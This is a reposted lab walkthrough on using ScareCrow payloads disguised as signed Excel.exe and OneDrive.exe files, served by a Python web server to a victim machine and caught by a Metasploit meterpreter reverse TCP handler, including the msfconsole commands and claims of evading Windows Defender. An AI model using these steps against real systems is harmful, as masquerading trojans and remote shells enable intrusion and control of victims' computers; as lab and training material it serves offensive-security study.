# :globe_with_meridians: Creating Payloads with ScareCrow to Mimic Reputable Sources and Bypass Anti-Virus

> **Original Source:** [Creating Payloads with ScareCrow to Mimic Reputable Sources and Bypass Anti-Virus](https://infosecwriteups.com/creating-payloads-with-scarecrow-to-mimic-reputable-sources-and-bypass-anti-virus-01196cac741e)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

Make a new payloads directorywithin the **ScareCrow **and copy the payloads to the payloads directory.


Start an HTTP server on port 80 using Python3 to allow users to serve files from the payloads directory over HTTP.


```
sudo python3 -m http.server 80
```


This msfconsole command launches the Metasploit console in quiet mode, suppressing banner and startup messages for a streamlined experience.


```
sudo msfconsole -q
```


This sequence of commands is used within the Metasploit Framework (msfconsole) to set up a handler to receive a reverse TCP shell connection.


```
use exploit/multi/handler
```


```
set payload windows/x64/meterpreter_reverse_tcp
```


```
set LHOST 10.0.200.30
```


```
set LPOST 443
```


```
run
```


It specifies the payload type (`windows/x64/meterpreter_reverse_tcp`), sets the listener's host IP address (`LHOST`) to `10.0.200.30`, and the listener's port (`LPORT`) to `443`. Finally, the `run` command initiates the handler, waiting for a connection from a target machine.


## Executing the Payloads


In a real-world scenario, an attacker would probably send the payload via email or other methods, but for the demonstration purposes of this lab, we will open the Brave browser on the victim machine and navigate to **10.0.200.30**.


The web server we created using Python3 is listing all of our payloads.


We will download and save the **Excel.exe **and **OneDrive.exe **files onto the victim’s machine.


We can also see the responses in the web server we created.


After saving the files, we can check the victim’s Downloads folder to find the Excel and OneDrive files with their actual icons. This is why ScareCrow is used.


Right-click on the Excel file → Click Properties → Click Details.


## Get Anbu Hack Ops’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Here, we can also see that Microsoft appears to have signed Excel.exe. It looks completely real, and Windows Defender won’t pick it up.


When we double-click the Excel file, it doesn’t look like what Excel would typically do, but it will run the payload and open a meterpreter session.

---

*Originally published on [Medium](https://infosecwriteups.com/creating-payloads-with-scarecrow-to-mimic-reputable-sources-and-bypass-anti-virus-01196cac741e). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
